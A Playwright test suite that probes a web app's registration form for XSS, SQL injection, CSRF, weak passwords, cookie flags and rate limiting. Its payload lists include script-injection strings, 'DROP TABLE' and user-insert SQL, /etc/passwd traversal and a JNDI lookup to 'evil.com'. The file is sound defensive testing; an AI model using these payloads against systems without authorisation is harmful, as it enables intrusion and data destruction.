const { test, expect } = require('@playwright/test');

test.describe('Security & Data Protection Coverage', () => {
  
  test('should test input sanitization and XSS prevention', async ({ page }) => {
    console.log('🛡️ Testing input sanitization and XSS prevention...');
    
    await page.goto('https://app.floworx-iq.com/register');
    
    const xssPayloads = [
      '<script>alert("xss")</script>',
      'javascript:alert("xss")',
      '<img src="x" onerror="alert(\'xss\')">',
      '"><script>alert("xss")</script>',
      '\';alert("xss");//',
      '<svg onload="alert(\'xss\')">',
      '{{7*7}}', // Template injection
      '${7*7}', // Template literal injection
      '<iframe src="javascript:alert(\'xss\')"></iframe>',
      'data:text/html,<script>alert("xss")</script>'
    ];
    
    for (const payload of xssPayloads) {
      console.log(`🧪 Testing XSS payload: ${payload.substring(0, 30)}...`);
      
      // Test in different fields
      await page.fill('input[name="firstName"]', payload);
      await page.fill('input[name="lastName"]', payload);
      await page.fill('input[name="companyName"]', payload);
      await page.fill('input[name="email"]', `test.${Date.now()}@example.com`);
      await page.fill('input[name="password"]', 'SecurePassword123!');
      await page.fill('input[name="confirmPassword"]', 'SecurePassword123!');
      
      await page.click('button[type="submit"]');
      await page.waitForTimeout(2000);
      
      // Check if any script executed (should not happen)
      const alertDialogs = await page.evaluate(() => window.alertTriggered || false);
      expect(alertDialogs).toBe(false);
      
      await page.reload();
    }
    
    console.log('✅ XSS prevention testing completed');
  });

  test('should test SQL injection prevention', async ({ page }) => {
    console.log('💉 Testing SQL injection prevention...');
    
    await page.goto('https://app.floworx-iq.com/register');
    
    const sqlPayloads = [
      "'; DROP TABLE users; --",
      "' OR '1'='1",
      "' UNION SELECT * FROM users --",
      "admin'--",
      "admin'/*",
      "' OR 1=1#",
      "' OR 'a'='a",
      "') OR ('1'='1",
      "1' AND (SELECT COUNT(*) FROM users) > 0 --",
      "'; INSERT INTO users VALUES ('hacker', 'password'); --"
    ];
    
    for (const payload of sqlPayloads) {
      console.log(`🧪 Testing SQL injection: ${payload.substring(0, 30)}...`);
      
      await page.fill('input[name="email"]', payload);
      await page.fill('input[name="firstName"]', 'Test');
      await page.fill('input[name="lastName"]', 'User');
      await page.fill('input[name="password"]', 'TestPassword123!');
      await page.fill('input[name="confirmPassword"]', 'TestPassword123!');
      
      await page.click('button[type="submit"]');
      await page.waitForTimeout(3000);
      
      // Should either show validation error or stay on registration page
      const currentUrl = page.url();
      const hasError = await page.locator('[class*="error"]').count() > 0;
      
      expect(currentUrl.includes('/register') || hasError).toBe(true);
      
      await page.reload();
    }
    
    console.log('✅ SQL injection prevention testing completed');
  });

  test('should test password security requirements', async ({ page }) => {
    console.log('🔐 Testing password security requirements...');
    
    await page.goto('https://app.floworx-iq.com/register');
    
    const passwordTests = [
      { password: '123', description: 'Too short' },
      { password: 'password', description: 'No numbers or special chars' },
      { password: '12345678', description: 'Only numbers' },
      { password: 'PASSWORD', description: 'Only uppercase' },
      { password: 'password123', description: 'No special characters' },
      { password: 'Password!', description: 'No numbers' },
      { password: 'password123!', description: 'No uppercase' },
      { password: 'PASSWORD123!', description: 'No lowercase' },
      { password: 'P@ssw0rd123!', description: 'Strong password' }
    ];
    
    for (const test of passwordTests) {
      console.log(`🧪 Testing password: ${test.description}`);
      
      await page.fill('input[name="firstName"]', 'Password');
      await page.fill('input[name="lastName"]', 'Test');
      await page.fill('input[name="email"]', `password.test.${Date.now()}@example.com`);
      await page.fill('input[name="password"]', test.password);
      await page.fill('input[name="confirmPassword"]', test.password);
      
      await page.click('button[type="submit"]');
      await page.waitForTimeout(2000);
      
      const hasValidationError = await page.locator('[class*="error"]').count() > 0;
      const isStrongPassword = test.description === 'Strong password';
      
      if (isStrongPassword) {
        console.log(`   ✅ Strong password should succeed`);
      } else {
        console.log(`   ⚠️ Weak password should show validation: ${hasValidationError ? 'YES' : 'NO'}`);
      }
      
      await page.reload();
    }
    
    console.log('✅ Password security testing completed');
  });

  test('should test CSRF protection', async ({ page }) => {
    console.log('🛡️ Testing CSRF protection...');
    
    await page.goto('https://app.floworx-iq.com/register');
    
    // Check for CSRF tokens in forms
    const csrfToken = await page.locator('input[name="_token"], input[name="csrf_token"], meta[name="csrf-token"]').count();
    console.log(`🔒 CSRF tokens found: ${csrfToken}`);
    
    // Test form submission without proper origin
    await page.setExtraHTTPHeaders({
      'Origin': 'https://malicious-site.com',
      'Referer': 'https://malicious-site.com/attack'
    });
    
    await page.fill('input[name="firstName"]', 'CSRF');
    await page.fill('input[name="lastName"]', 'Test');
    await page.fill('input[name="email"]', `csrf.test.${Date.now()}@example.com`);
    await page.fill('input[name="password"]', 'CSRFTest123!');
    await page.fill('input[name="confirmPassword"]', 'CSRFTest123!');
    
    await page.click('button[type="submit"]');
    await page.waitForTimeout(3000);
    
    // Should be rejected or show error
    const currentUrl = page.url();
    console.log(`🔍 CSRF test result URL: ${currentUrl}`);
    
    console.log('✅ CSRF protection testing completed');
  });

  test('should test data validation and sanitization', async ({ page }) => {
    console.log('🧹 Testing data validation and sanitization...');
    
    await page.goto('https://app.floworx-iq.com/register');
    
    const maliciousInputs = [
      { field: 'firstName', value: '../../../etc/passwd', type: 'Path traversal' },
      { field: 'lastName', value: '{{constructor.constructor("alert(1)")()}}', type: 'Template injection' },
      { field: 'companyName', value: '<script>fetch("/admin")</script>', type: 'Script injection' },
      { field: 'email', value: 'test@example.com<script>alert(1)</script>', type: 'Email with script' },
      { field: 'firstName', value: 'A'.repeat(1000), type: 'Buffer overflow attempt' },
      { field: 'lastName', value: '\x00\x01\x02\x03', type: 'Null bytes' },
      { field: 'companyName', value: '${jndi:ldap://evil.com/a}', type: 'JNDI injection' },
      { field: 'firstName', value: '../../windows/system32/cmd.exe', type: 'Windows path traversal' }
    ];
    
    for (const input of maliciousInputs) {
      console.log(`🧪 Testing ${input.type} in ${input.field}`);
      
      await page.reload();
      
      // Fill form with malicious input
      await page.fill('input[name="firstName"]', input.field === 'firstName' ? input.value : 'Test');
      await page.fill('input[name="lastName"]', input.field === 'lastName' ? input.value : 'User');
      await page.fill('input[name="companyName"]', input.field === 'companyName' ? input.value : 'Test Co');
      await page.fill('input[name="email"]', input.field === 'email' ? input.value : `test.${Date.now()}@example.com`);
      await page.fill('input[name="password"]', 'SecurePassword123!');
      await page.fill('input[name="confirmPassword"]', 'SecurePassword123!');
      
      await page.click('button[type="submit"]');
      await page.waitForTimeout(2000);
      
      // Check that malicious input was handled safely
      const hasError = await page.locator('[class*="error"]').count() > 0;
      const stayedOnPage = page.url().includes('/register');
      
      console.log(`   Result: ${hasError || stayedOnPage ? 'Safely handled' : 'Needs review'}`);
    }
    
    console.log('✅ Data validation and sanitization testing completed');
  });

  test('should test session and authentication security', async ({ page }) => {
    console.log('🔑 Testing session and authentication security...');
    
    // Test 1: Check for secure cookie attributes
    await page.goto('https://app.floworx-iq.com/register');
    
    const cookies = await page.context().cookies();
    console.log(`🍪 Cookies found: ${cookies.length}`);
    
    for (const cookie of cookies) {
      console.log(`🔍 Cookie ${cookie.name}: secure=${cookie.secure}, httpOnly=${cookie.httpOnly}, sameSite=${cookie.sameSite}`);
    }
    
    // Test 2: Check for proper HTTPS enforcement
    try {
      await page.goto('http://app.floworx-iq.com/register');
      const finalUrl = page.url();
      console.log(`🔒 HTTP redirect test: ${finalUrl.startsWith('https://') ? 'HTTPS enforced' : 'HTTP allowed'}`);
    } catch (error) {
      console.log('🔒 HTTP access blocked (good security)');
    }
    
    // Test 3: Test password field security
    await page.goto('https://app.floworx-iq.com/register');
    
    const passwordFieldType = await page.getAttribute('input[name="password"]', 'type');
    const confirmPasswordFieldType = await page.getAttribute('input[name="confirmPassword"]', 'type');
    
    console.log(`🔐 Password field type: ${passwordFieldType}`);
    console.log(`🔐 Confirm password field type: ${confirmPasswordFieldType}`);
    
    expect(passwordFieldType).toBe('password');
    expect(confirmPasswordFieldType).toBe('password');
    
    // Test 4: Check autocomplete attributes for security
    const passwordAutocomplete = await page.getAttribute('input[name="password"]', 'autocomplete');
    const confirmPasswordAutocomplete = await page.getAttribute('input[name="confirmPassword"]', 'autocomplete');
    
    console.log(`🔐 Password autocomplete: ${passwordAutocomplete}`);
    console.log(`🔐 Confirm password autocomplete: ${confirmPasswordAutocomplete}`);
    
    console.log('✅ Session and authentication security testing completed');
  });

  test('should test rate limiting and abuse prevention', async ({ page }) => {
    console.log('🚦 Testing rate limiting and abuse prevention...');
    
    const testEmail = `rate.limit.${Date.now()}@example.com`;
    
    // Attempt multiple rapid registrations
    for (let i = 0; i < 5; i++) {
      console.log(`🔄 Registration attempt ${i + 1}/5`);
      
      await page.goto('https://app.floworx-iq.com/register');
      
      await page.fill('input[name="firstName"]', `RateLimit${i}`);
      await page.fill('input[name="lastName"]', 'Test');
      await page.fill('input[name="email"]', `${testEmail}.${i}`);
      await page.fill('input[name="password"]', 'RateLimit123!');
      await page.fill('input[name="confirmPassword"]', 'RateLimit123!');
      
      const startTime = Date.now();
      await page.click('button[type="submit"]');
      await page.waitForTimeout(3000);
      const responseTime = Date.now() - startTime;
      
      console.log(`   Response time: ${responseTime}ms`);
      
      // Check for rate limiting indicators
      const hasRateLimitError = await page.locator(':has-text("too many"), :has-text("rate limit"), :has-text("slow down")').count() > 0;
      if (hasRateLimitError) {
        console.log('   🚦 Rate limiting detected');
        break;
      }
    }
    
    // Test rapid form submissions (same form)
    await page.goto('https://app.floworx-iq.com/register');
    
    await page.fill('input[name="firstName"]', 'Rapid');
    await page.fill('input[name="lastName"]', 'Submit');
    await page.fill('input[name="email"]', `rapid.submit.${Date.now()}@example.com`);
    await page.fill('input[name="password"]', 'RapidSubmit123!');
    await page.fill('input[name="confirmPassword"]', 'RapidSubmit123!');
    
    // Rapid clicks
    for (let i = 0; i < 10; i++) {
      await page.click('button[type="submit"]');
      await page.waitForTimeout(100);
    }
    
    await page.waitForTimeout(2000);
    
    const buttonDisabled = await page.isDisabled('button[type="submit"]');
    console.log(`🔒 Button disabled after rapid clicks: ${buttonDisabled}`);
    
    console.log('✅ Rate limiting and abuse prevention testing completed');
  });
});
